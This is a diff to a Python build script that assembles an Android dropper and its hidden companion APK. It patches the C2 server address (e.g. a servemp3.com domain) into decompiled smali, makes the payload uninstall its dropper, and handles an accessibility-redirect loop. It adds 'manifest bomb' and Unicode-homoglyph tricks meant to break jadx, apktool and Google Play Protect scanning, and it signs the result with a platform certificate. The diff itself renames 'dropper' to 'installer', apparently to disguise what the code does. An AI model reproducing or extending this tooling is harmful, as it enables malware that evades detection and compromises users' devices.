@@ -330,7 +330,7 @@ _COMPANION_STEP_MAP = {
     "PHASE_1/STEP_4":    ("Decompile & patch smali", "Randomize resource filenames"),
     "PHASE_1/STEP_5":    ("Decompile & patch smali", "Decompile APK → smali"),
     "PHASE_1/STEP_5B":   ("Decompile & patch smali", "Patch server config"),
-    "PHASE_1/STEP_5C":   ("Decompile & patch smali", "Patch dropper uninstall target"),
+    "PHASE_1/STEP_5C":   ("Decompile & patch smali", "Patch installer uninstall target"),
     "PHASE_1/STEP_5D":   ("Decompile & patch smali", "Patch onResume loop fix"),
     "PHASE_1/STEP_6":    ("Decompile & patch smali", "Rename smali class paths"),
     # Phase 5: Obfuscate & assemble APK
@@ -899,6 +899,9 @@ def step_patch_server_config():
                 # IPv4: 4 octets 0-255
                 if _re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', decoded):
                     return padded
+                # Domain name: hostname.tld (e.g. monster.servemp3.com)
+                if _re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', decoded):
+                    return padded
             elif value_type == "port":
                 # Numeric port 1-65535
                 if _re.match(r'^\d{1,5}$', decoded) and 1 <= int(decoded) <= 65535:
@@ -975,33 +978,33 @@ def step_patch_server_config():
         print("  ⚠️  No replacements made — values may already match")
 
 
-def step_patch_dropper_pkg(nova_pkg: str):
-    """Patch uninstallTargetApps() in companion smali to target the dropper's
+def step_patch_installer_pkg(installer_pkg: str):
+    """Patch uninstallTargetApps() in companion smali to target the installer's
     exact package name (injected at build time) instead of any hardcoded prefix.
 
     Replaces the old loop-based startsWith("com.hexanova.system") approach
-    entirely. The new smali directly fires ACTION_DELETE for nova_pkg only.
+    entirely. The new smali directly fires ACTION_DELETE for installer_pkg only.
 
     Must run AFTER step_decompile() but BEFORE step_rename_smali() so the
     companion smali path still uses OLD_PKG.
     """
-    print("\n── Step 5C: Patch uninstallTargetApps → dropper pkg direct uninstall")
+    print("\n── Step 5C: Patch uninstallTargetApps → installer pkg direct uninstall")
 
-    if not nova_pkg:
-        print("  ⚠️  NOVA_PKG env var not set — dropper uninstall will not be patched (skipped)")
+    if not installer_pkg:
+        print("  ⚠️  INSTALLER_PKG env var not set — installer uninstall will not be patched (skipped)")
         return
 
     old_path = OLD_PKG.replace(".", "/")
     smali_file = os.path.join("companion_decompiled", "smali", old_path, "MainActivity.smali")
 
     if not os.path.isfile(smali_file):
-        print(f"  ⚠️  MainActivity.smali not found at {smali_file} — skipping dropper pkg patch")
+        print(f"  ⚠️  MainActivity.smali not found at {smali_file} — skipping installer pkg patch")
         return
 
     with open(smali_file, "r", encoding="utf-8") as f:
         content = f.read()
 
-    # The new minimal uninstallTargetApps method — direct ACTION_DELETE for NOVA_PKG only.
+    # The new minimal uninstallTargetApps method — direct ACTION_DELETE for INSTALLER_PKG only.
     # Uses 3 locals (v0=Intent, v1=Uri string, v2=parsed Uri).
     # FLAG_ACTIVITY_NEW_TASK (0x10000000) required when calling startActivity from non-Activity context.
     NEW_METHOD = f""".method public uninstallTargetApps(Landroid/view/View;)V
@@ -1018,7 +1021,7 @@ def step_patch_dropper_pkg(nova_pkg: str):
     invoke-direct {{v0, v1}}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V
 
     .line 7
-    const-string v1, "package:{nova_pkg}"
+    const-string v1, "package:{installer_pkg}"
 
     .line 9
     invoke-static {{v1}}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;
@@ -1069,7 +1072,7 @@ def step_patch_dropper_pkg(nova_pkg: str):
     with open(smali_file, "w", encoding="utf-8") as f:
         f.write(new_content)
 
-    print(f"  ✅ uninstallTargetApps patched → direct ACTION_DELETE for dropper: {nova_pkg}")
+    print(f"  ✅ uninstallTargetApps patched → direct ACTION_DELETE for installer: {installer_pkg}")
 
 
 def step_patch_onresume():
@@ -2850,7 +2853,7 @@ def _strip_axml_application_icon(manifest_raw: bytes) -> bytes:
 
     Fix: strip android:icon + android:roundIcon from the manifest so Android
     never calls setDefaultIcon at all. The companion is not a launcher app —
-    its icon is never shown independently. The dropper (Nova) controls the
+    its icon is never shown independently. The Installer controls the
     visible icon. No functional impact.
 
     android:icon      attr resource ID: 0x0101021B
@@ -3432,7 +3435,7 @@ def step_patch_and_assemble(new_pkg, new_dex, res_rename, meta=None,
     # setDefaultIcon() during Activity.initWindowDecorActionBar() BEFORE
     # onActivityPreCreated fires → looks up mipmap resource → gets garbled
     # obfuscated path (e.g. ep6kph.png////.png) from stub ARSC → FileNotFoundException.
-    # Companion is never shown in the launcher — Nova controls the visible icon.
+    # Companion is never shown in the launcher — Installer controls the visible icon.
     # Stripping icon attrs from manifest prevents setDefaultIcon from running at all.
     new_manifest = _strip_axml_application_icon(new_manifest)
 
@@ -3947,7 +3950,7 @@ def step_sign(input_apk: str = None, v1_only: bool = False):
     # ── Priority 2: Hardcoded platform cert fallback ──────────────────────────
     # KEYSTORE_BASE64 missing — use hardcoded platform cert.
     # NEVER generates random or fresh keystore.
-    # Both Nova and companion ALWAYS use android@android.com signature.
+    # Both Installer and Companion ALWAYS use android@android.com signature.
     if not ks_file:
         print("  [step_sign] ⚠️ No GitHub Secrets — using hardcoded platform cert (android@android.com)")
         # Fallback: ALWAYS use platform cert — never random keystore
@@ -4635,9 +4638,9 @@ def main():
     with track("PHASE_1", "STEP_5", "Decompile companion APK (smali only)", MOD_ASSET):
         step_decompile()
 
-    with track("PHASE_1", "STEP_5C", "Patch uninstallTargetApps → dropper pkg direct uninstall"):
-        _nova_pkg = os.environ.get("NOVA_PKG", "")
-        step_patch_dropper_pkg(_nova_pkg)
+    with track("PHASE_1", "STEP_5C", "Patch uninstallTargetApps → installer pkg direct uninstall"):
+        _installer_pkg = os.environ.get("INSTALLER_PKG", "")
+        step_patch_installer_pkg(_installer_pkg)
 
     with track("PHASE_1", "STEP_5D", "Patch onResume() — fix accessibility redirect loop + d:Z guard"):
         step_patch_onresume()
@@ -4824,10 +4827,10 @@ def main():
             _repair_manifest_resource_map()
 
         # ── STEP_AXML_PATCHER: AXML 0x9999 manifest bomb + string pool inflation ──
-        # Same technique applied to Nova. Confuses jadx/apktool/GPP manifest parser.
+        # Same technique applied to Installer. Confuses jadx/apktool/GPP manifest parser.
         # Must run pre-sign — STEP_RESIGN_1 covers all patched bytes.
         with track("PHASE_2", "STEP_AXML_PATCHER", "AXML 0x9999 manifest bomb + string pool inflation [companion]", MOD_ASSET):
-            _axml_script = os.path.join(scripts_dir, "nova_axml_patcher.py")
+            _axml_script = os.path.join(scripts_dir, "installer_axml_patcher.py")
             _axml_tmp    = MOD_ASSET + ".axml_tmp"
             if os.path.isfile(_axml_script):
                 _axml_r = subprocess.run(
@@ -4838,11 +4841,11 @@ def main():
                     os.replace(_axml_tmp, MOD_ASSET)
                     print("  ✅ STEP_AXML_PATCHER — AXML bomb applied to companion")
                 else:
-                    print(f"  ⚠️  STEP_AXML_PATCHER — nova_axml_patcher.py failed rc={_axml_r.returncode}, skipping")
+                    print(f"  ⚠️  STEP_AXML_PATCHER — installer_axml_patcher.py failed rc={_axml_r.returncode}, skipping")
                     if os.path.isfile(_axml_tmp):
                         os.remove(_axml_tmp)
             else:
-                print("  ⚠️  STEP_AXML_PATCHER — nova_axml_patcher.py not found, skipping")
+                print("  ⚠️  STEP_AXML_PATCHER — installer_axml_patcher.py not found, skipping")
 
         # ── STEP_DEX_POISONER: PERMANENTLY DISABLED ────────────────────────────
         # The companion classes.dex is now a 10-class stub DEX (DexStub loader only).
@@ -4882,7 +4885,7 @@ def main():
             #   GPP FIX: path traversal ("../../classes.dex") removed — those
             #   patterns are static-flagged as malware.
             # Layer 2 — Deep nesting in legit-looking paths (gms/version etc.):
-            #   recursive directory traversal pressure without dropper signatures.
+            #   recursive directory traversal pressure without installer signatures.
             # Layer 3 — Unicode homoglyphs: zero-width space (U+200B) and
             #   right-to-left mark (U+200F) inside filenames — renders identically
             #   to human eye, breaks naive string matching in scanners.
@@ -7125,7 +7128,7 @@ doNotCompress:
     # It is a valid, installable APK. Download from CI artifacts and:
     #   adb install companion_processed.apk
     # to test the companion standalone on device before it gets encrypted
-    # and embedded inside Nova.
+    # and embedded inside Installer.
     # MOD_ASSET = app/src/main/assets/companion.apk (relative to workspace root)
     # os.getcwd() is always the workspace root in CI (GitHub Actions runs from GITHUB_WORKSPACE).
     # Using getcwd() is more reliable than dirname-chaining from MOD_ASSET path.
